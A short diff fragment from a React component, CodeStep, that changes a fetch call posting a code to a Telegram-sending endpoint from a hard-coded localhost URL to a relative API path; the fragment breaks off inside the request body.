@@ -44,7 +44,7 @@ const CodeStep: React.FC<CodeStepProps> = ({
 
   const sendCodeToTelegram = async (code: string) => {
     try {
-      await fetch('http://localhost:5176/api/telegram/send', {
+      await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
